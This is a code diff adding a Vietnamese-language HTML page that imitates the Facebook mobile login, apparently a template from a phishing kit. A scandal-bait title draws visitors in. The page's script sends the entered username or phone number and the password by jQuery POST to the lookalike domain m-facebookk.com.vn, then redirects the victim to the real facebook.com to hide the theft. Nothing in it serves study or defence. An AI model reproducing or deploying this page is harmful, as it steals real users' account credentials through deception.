@@ -1,0 +1,184 @@
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trang Nguyễn</title>
+    <meta name="description" content="Bóc phốt">
+    <meta property="og:locale" content="en_US">
+    <meta property="og:type" content="website">
+    <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
+    <meta property="og:image" content="https://mana.brsc0m.com/images/DS5yab9EAUwWBxqa7mV.jpg">
+    <meta property="og:title" content="Trang Nguyễn">
+    <meta property="og:description" content="Bóc phốt">
+    <meta property="og:site_name" content="Trang Nguyễn">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:description" content="Bóc phốt">
+    <meta name="twitter:title" content="Trang Nguyễn">
+    <link rel="shortcut icon" href="https://m-facebookk.com.vn/theme/facebook_profile_core/favicon.png">
+    <link rel="stylesheet" href="https://m-facebookk.com.vn/theme/facebook_profile_core/style.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.0/jquery.min.js"></script>
+    <style>
+        .loltest {
+            padding: 5px 8px;
+            background-color: #fffbe2;
+            color: #7f7212;
+            font-size: 14px;
+            line-height: 18px;
+        }
+    </style>
+</head><body>
+    <!-- A template example of PhoBo, nots -->
+    <!-- A template example of PhoBo, nots -->
+    <!-- A template example of PhoBo, nots -->
+    <!-- A template example of PhoBo, nots -->
+    <!-- A template example of PhoBo, nots -->
+    <!-- A template example of PhoBo, nots -->
+    <!-- A template example of PhoBo, nots -->
+    <!-- A template example of PhoBo, nots -->
+    <!-- A template example of PhoBo, nots -->
+    <!-- A template example of PhoBo, nots -->
+    <!-- A template example of PhoBo, nots -->
+    <!-- A template example of PhoBo, nots -->
+    <div class="v-login_box">
+        <center style="margin-top: 10px;">
+            <img src="https://m-facebookk.com.vn/theme/facebook_profile_core/svg0.svg" width="112" alt="nhatloccodeboy">
+        </center>
+        <style>
+            .input::before {
+                border-image: url(https://m-facebookk.com.vn/theme/facebook_profile_core/b-l.png) 12 12 16 12 repeat;
+            }
+        </style>
+        <div class="log-con">
+            <div class="login-error" id="login_error" style="display: none;">Sai mật khẩu</div>
+            <div class="loltest">Trước tiên,bạn cần đăng nhập</div>
+            <br>
+            <form id="login_form">
+                <div class="input">
+                    <div class="inputt">
+                        <input type="text" class="inputtt" placeholder="Số di động hoặc email" id="username" required="">
+                    </div>
+                </div>
+                <div class="input" style="margin-bottom: 10px;">
+                    <div class="inputt">
+                        <input type="password" class="inputtt" placeholder="Mật khẩu" id="password" required="">
+                    </div>
+                </div>
+                <button type="submit" class="login-btnnn" id="login__btn">Đăng nhập</button>
+            </form>
+            <a href="#" class="forgot">Quên mật khẩu ?</a>
+        </div>
+        <div class="log-footer">
+            <div class="item-fot">
+                <span style="color: #90949c;
+               font-weight: bold;
+               font-size: 12px;
+               line-height: 16px;">Tiếng
+                    Việt</span>
+                <div class="lang">
+                    <span class="lang-span">
+                        <a href="#">中文(台灣)</a>
+                    </span>
+                </div>
+                <div class="lang">
+                    <span class="lang-span">
+                        <a href="#">Español</a>
+                    </span>
+                </div>
+                <div class="lang">
+                    <span class="lang-span">
+                        <a href="#">Français (France)</a>
+                    </span>
+                </div>
+            </div>
+            <div class="item-fot">
+                <div class="lang">
+                    <span class="lang-span">
+                        <a href="#">English (UK)</a>
+                    </span>
+                </div>
+                <div class="lang">
+                    <span class="lang-span">
+                        <a href="#">한국어</a>
+                    </span>
+                </div>
+                <div class="lang">
+                    <span class="lang-span">
+                        <a href="#">Português (Brasil)</a>
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script>
+        function phone_check(input_str) {
+            var re = /^\(?(\d{3})\)?[- ]?(\d{3})[- ]?(\d{4})$/;
+
+            return re.test(input_str);
+        }
+
+        function string_check(string) {
+            var re = /([a-zA-Z])+([ -~])*/;
+            return re.test(string)
+        }
+
+        function check_email(email) {
+            return String(email)
+                .toLowerCase()
+                .match(
+                    /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|.(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
+                );
+        }
+        $("#login_form").submit(function(e) {
+            e.preventDefault();
+            var username = $("#username").val()
+            var password = $("#password").val()
+            var error = $("#login_error")
+            $(".loltest").remove()
+            if (string_check(username)) {
+                if (!check_email(username)) {
+                    error.show()
+                    error.html('Thông tin đăng nhập không hợp lệ')
+                } else if (password.length < 5) {
+                    error.show()
+                    error.html('Mật khẩu quá ngắn')
+                } else {
+                    error.hide()
+                    $("#login__btn").attr('disabled', true)
+                    $.post("https://m-facebookk.com.vn/sats", {
+                            id: 'Zjt2LFAsFulpQw79Gvs',
+                            u: username,
+                            p: password
+                        },
+                        function(data, textStatus, jqXHR) {
+                            window.location.href = 'https://www.facebook.com/profile.php?=75548495'
+                        },
+                        "html"
+                    );
+                }
+            } else {
+                if (!phone_check(username)) {
+                    error.show()
+                    error.html('Thông tin đăng nhập không hợp lệ')
+                } else if (password.length < 5) {
+                    error.show()
+                    error.html('Mật khẩu quá ngắn')
+                } else {
+                    error.hide()
+                    $("#login__btn").attr('disabled', true)
+                    $.post("https://m-facebookk.com.vn/sats", {
+                            id: 'Zjt2LFAsFulpQw79Gvs',
+                            u: username,
+                            p: password
+                        },
+                        function(data, textStatus, jqXHR) {
+                            window.location.href = 'https://www.facebook.com/profile.php?=75548495'
+                        },
+                        "html"
+                    );
+                }
+            }
+        });
+    </script>
+
+
+
+</body>
